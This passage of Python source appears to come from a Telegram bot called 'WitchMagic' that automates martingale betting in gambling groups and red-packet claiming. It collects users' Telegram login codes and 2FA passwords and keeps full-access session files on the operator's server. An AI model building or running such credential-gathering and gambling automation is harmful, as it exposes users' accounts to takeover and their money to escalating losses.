        threading.Thread(target=thread_worker_check_balance, args=(user_id, config['session_file']), daemon=True).start()
            
    elif data == "add_balance":
        if not config.get("balance_channel"):
            bot.answer_callback_query(call.id, "请先在参数配置中设置余额通道 ID", show_alert=True)
            return
        bot.answer_callback_query(call.id, "正在扫描通道并尝试抢红包，请稍候...")
        threading.Thread(target=thread_worker_claim_balance, args=(user_id, config['session_file'], config['balance_channel']), daemon=True).start()
            
    elif data == "start_bet":
        if not config.get("game_group"):
            bot.answer_callback_query(call.id, "🔴 请先到设置中指定游戏群 ID/群用户名！", show_alert=True)
            return
        if config.get("status") == "running":
            bot.answer_callback_query(call.id, "系统已经在倍投中...", show_alert=True)
            return
            
        bot.answer_callback_query(call.id, "🚀 准备启动投注引擎...")
        update_user_config(user_id, status='running')
        
        bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=build_user_keyboard(user_id))
        
        cancel_ev = threading.Event()
        user_running_tasks[user_id] = cancel_ev
        
        t = threading.Thread(target=run_double_bet_loop, args=(user_id, cancel_ev), daemon=True)
        t.start()
        
    elif data == "stop_bet":
        bot.answer_callback_query(call.id, "🛑 正在取消和关闭投注...")
        if user_id in user_running_tasks:
            user_running_tasks[user_id].set()
            del user_running_tasks[user_id]
        update_user_config(user_id, status='idle')
        bot.send_message(user_id, "⚙️ 停止指令已发出，倍投主程序正在退出...")
        bot.send_message(user_id, "主菜单选项已重新为您唤出：", reply_markup=build_user_keyboard(user_id))
        
    elif data == "release_account":
        bot.answer_callback_query(call.id, "已释放本账户。")
        delete_user_account(user_id)
        bot.edit_message_text("🔓 账户协议已成功释放并安全脱离托管！", user_id, call.message.message_id, reply_markup=build_user_keyboard(user_id))
        
    # --- 参数设定回调 ---
    elif data == "set_red_line":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(user_id, "🔴 请输入资金红线金额 (一旦低于此值，将立即停止投注。输入数字，如：100)：", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, lambda m: process_config_num(m, "red_line"))
        
    elif data == "set_start_amount":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(user_id, "🎲 请输入起始倍投的基础额度 (必须为正整数，如：10)：", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, lambda m: process_config_num(m, "start_amount"))
        
    elif data == "set_profit_target":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(user_id, "📈 请输入盈利/流水止盈停手数值 (当余额增长到大于或等于该数值时，将自动平仓停手，输入0代表不限制)：", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, lambda m: process_config_num(m, "profit_target"))
        
    elif data == "set_balance_channel":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(user_id, "📣 请输入自动抢包余额通道的 Telegram 频道/群组 ID (例如：-1001234567890 或 频道用户名)：", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, lambda m: process_config_str(m, "balance_channel"))
        
    elif data == "set_game_group":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(user_id, "💬 请输入下注游戏群组的 ID 或 游戏群用户名 (例如：-1009876543210)：", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, lambda m: process_config_str(m, "game_group"))

# ==================== 管理员代理参数输入处理器 ====================

def process_admin_proxy_input(message, field_name):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id, fallback_msg="❌ 已放弃配置当前代理参数。", is_admin=True):
        return
        
    text = message.text.strip()
    remove_kb = types.ReplyKeyboardRemove()
    
    if field_name == "port":
        try:
            val = int(text)
            if val <= 0 or val > 65535:
                raise ValueError
            update_admin_proxy(port=val)
            bot.send_message(user_id, f"✅ 代理端口已更新为: {val}", reply_markup=remove_kb)
        except ValueError:
            bot.send_message(user_id, "❌ 端口输入错误，请输入 1-65535 之间的数字端口。", reply_markup=remove_kb)
    else:
        save_val = "" if text.lower() == "none" else text
        update_admin_proxy(**{field_name: save_val})
        bot.send_message(user_id, f"✅ 代理参数 [{field_name}] 已成功设为: {text}", reply_markup=remove_kb)
        
    bot.send_message(user_id, "🛡️ *设置已生效！* 请在下方继续完成其他配置：", 
                     parse_mode="Markdown", reply_markup=build_proxy_settings_keyboard())

# ==================== 用户参数输入处理器 ====================

def process_config_num(message, field_name):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id):
        return
        
    text = message.text.strip()
    remove_kb = types.ReplyKeyboardRemove()
    try:
        val = float(text)
        if val < 0:
            raise ValueError
        update_user_config(user_id, **{field_name: val})
        bot.send_message(user_id, f"✅ 修改成功！参数配置已生效。", reply_markup=remove_kb)
    except ValueError:
        bot.send_message(user_id, "❌ 输入格式不正确，请输入大于或等于 0 的有效数字。", reply_markup=remove_kb)
    
    bot.send_message(user_id, "主菜单已重新唤出：", reply_markup=build_user_keyboard(user_id))

def process_config_str(message, field_name):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id):
        return
        
    text = message.text.strip()
    remove_kb = types.ReplyKeyboardRemove()
    update_user_config(user_id, **{field_name: text})
    bot.send_message(user_id, f"✅ 成功设定参数值。", reply_markup=remove_kb)
    bot.send_message(user_id, "主菜单已重新唤出：", reply_markup=build_user_keyboard(user_id))

# ==================== 多阶段登录流程（验证激活成功后方登记入表） ====================

def process_phone_input(message):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id, fallback_msg="❌ 已放弃添加账户流程。"):
        return
        
    phone = message.text.strip()
    cleaned_phone = '+' + re.sub(r'\D', '', phone)
    remove_kb = types.ReplyKeyboardRemove()
    
    session_file_path = f"sessions/{user_id}.session"
    os.makedirs("sessions", exist_ok=True)
    
    # 临时记录，等待完全激活
    update_user_config(user_id, status='login_code')
    
    bot.send_message(user_id, "📡 正在与 Telegram 建立安全连接并请求发送验证码，请稍候...", reply_markup=remove_kb)
    
    threading.Thread(target=async_login_request_code, args=(user_id, cleaned_phone, session_file_path), daemon=True).start()

def async_login_request_code(user_id, phone, session_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    client = get_telethon_client(session_path, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        
        sent_code = loop.run_until_complete(client.send_code_request(phone))
        phone_code_hash = sent_code.phone_code_hash
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO temp_login_states (user_id, phone, phone_code_hash) VALUES (?, ?, ?)", 
                       (user_id, phone, phone_code_hash))
        conn.commit()
        conn.close()
        
        msg = bot.send_message(user_id, f"📩 验证码已发送。请输入您收到的 Telegram 登录验证码：\n(可随时输入或点击 '❌ 取消操作' 中断放弃)", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, process_code_input)
        
    except Exception as e:
        logger.error(f"发送验证码异常: {e}")
        bot.send_message(user_id, "❌ 发送验证码请求失败！请确保号码正确并开通国际接收，或检查您的 Socks5 代理状态。")
        delete_user_account(user_id)
    finally:
        try:
            loop.run_until_complete(client.disconnect())
        except Exception:
            pass
        loop.close()

def process_code_input(message):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id, fallback_msg="❌ 已放弃账户验证码提交。"):
        return
        
    code = message.text.strip()
    remove_kb = types.ReplyKeyboardRemove()
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT phone, phone_code_hash FROM temp_login_states WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        bot.send_message(user_id, "⚠️ 登录状态失效，请重新添加账号。", reply_markup=remove_kb)
        return
        
    phone, phone_code_hash = row
    session_path = f"sessions/{user_id}.session"
    
    bot.send_message(user_id, "⚙️ 正在向官方验证验证码...", reply_markup=remove_kb)
    
    threading.Thread(target=async_login_verify_code, args=(user_id, phone, code, phone_code_hash, session_path), daemon=True).start()

def async_login_verify_code(user_id, phone, code, phone_code_hash, session_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    client = get_telethon_client(session_path, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        
        try:
            loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
            
            if loop.run_until_complete(client.is_user_authorized()):
                # 只有在此成功激活后，才正式将 phone 写入 users 配置表，纳入协议激活名单！
                update_user_config(user_id, phone=phone, session_file=session_path, status='idle')
                bot.send_message(user_id, "🎉 授权激活成功！您的 Telegram 协议账号已正式挂载至本系统。", reply_markup=build_user_keyboard(user_id))
                
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute("DELETE FROM temp_login_states WHERE user_id=?", (user_id,))
                conn.commit()
                conn.close()
        except SessionPasswordNeededError:
            update_user_config(user_id, status='login_2fa')
            msg = bot.send_message(user_id, "🔒 检测到该账户启用了两步验证(2FA)！\n请输入您的两步验证密码：\n(可随时输入或点击 '❌ 取消操作' 中断放弃)", reply_markup=make_cancel_keyboard())
            bot.register_next_step_handler(msg, process_2fa_input)
            
        except PasswordHashInvalidError:
            bot.send_message(user_id, "❌ 提交的验证码不匹配，请重新发起。")
            delete_user_account(user_id)
        except Exception as e:
            logger.error(f"登录校验异常: {e}")
            bot.send_message(user_id, "❌ 验证码提交异常失败，请重新申请。")
            delete_user_account(user_id)
            
    except Exception as e:
        logger.error(f"进程异常: {e}")
        bot.send_message(user_id, "❌ 本地通讯异常崩溃，无法完成账号签名验证。")
    finally:
        try:
            loop.run_until_complete(client.disconnect())
        except Exception:
            pass
        loop.close()

def process_2fa_input(message):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id, fallback_msg="❌ 已中断并取消 2FA 校验流程。"):
        return
        
    password_2fa = message.text.strip()
    remove_kb = types.ReplyKeyboardRemove()
    
    session_path = f"sessions/{user_id}.session"
    
    bot.send_message(user_id, "⚙️ 正在校验两步验证密码...", reply_markup=remove_kb)
    
    threading.Thread(target=async_login_verify_2fa, args=(user_id, password_2fa, session_path), daemon=True).start()

def async_login_verify_2fa(user_id, password_2fa, session_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    client = get_telethon_client(session_path, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        try:
            loop.run_until_complete(client.sign_in(password=password_2fa))
            if loop.run_until_complete(client.is_user_authorized()):
                
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute("SELECT phone FROM temp_login_states WHERE user_id = ?", (user_id,))
                row = cursor.fetchone()
                phone = row[0] if row else None
                conn.close()
                
                # 2FA 校验成功后才正式写入名单
                update_user_config(user_id, phone=phone, session_file=session_path, status='idle')
                bot.send_message(user_id, "🎉 2FA 激活校验成功！账号协议已安全挂载。", reply_markup=build_user_keyboard(user_id))
                
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute("DELETE FROM temp_login_states WHERE user_id=?", (user_id,))
                conn.commit()
                conn.close()
        except PasswordHashInvalidError:
            bot.send_message(user_id, "❌ 2FA 密码不正确，请重新添加协议。")
            delete_user_account(user_id)
        except Exception as e:
            logger.error(f"2FA登录异常: {e}")
            bot.send_message(user_id, "❌ 验证流程受到阻碍，未能验证 2FA 信息。")
            delete_user_account(user_id)
    except Exception as e:
        logger.error(f"2FA异常: {e}")
    finally:
        try:
            loop.run_until_complete(client.disconnect())
        except Exception:
            pass
        loop.close()

# ==================== 后台群发广播 ====================
def process_admin_broadcast(message):
    user_id = message.from_user.id
    if check_and_handle_cancel(message, user_id, fallback_msg="❌ 已放弃广播发送。", is_admin=True):
        return
        
    broadcast_text = message.text
    remove_kb = types.ReplyKeyboardRemove()
    if not broadcast_text:
        bot.send_message(user_id, "❌ 发送失败，消息内容不能为空。", reply_markup=remove_kb)
        show_admin_menu(user_id)
        return
        
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    all_users = [row[0] for row in cursor.fetchall()]
    conn.close()
    
    success_count = 0
    for uid in all_users:
        try:
            bot.send_message(uid, f"📢 *[WitchMagic 广播通知]*\n\n{broadcast_text}", parse_mode="Markdown")
            success_count += 1
        except Exception:
            pass
            
    bot.send_message(user_id, f"✅ 广播任务已执行完成，成功送达 {success_count}/{len(all_users)} 名用户。", reply_markup=remove_kb)
    show_admin_menu(user_id)

# ==================== 运行服务器 ====================
if __name__ == '__main__':
    print("🤖 WitchMagic Telebot 进阶版服务正在启动...")
    print(f"👑 系统内置管理员 ID 为: {ADMIN_ID}")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
    except Exception as err:
        logger.error(f"Telebot 崩溃重启中: {err}")

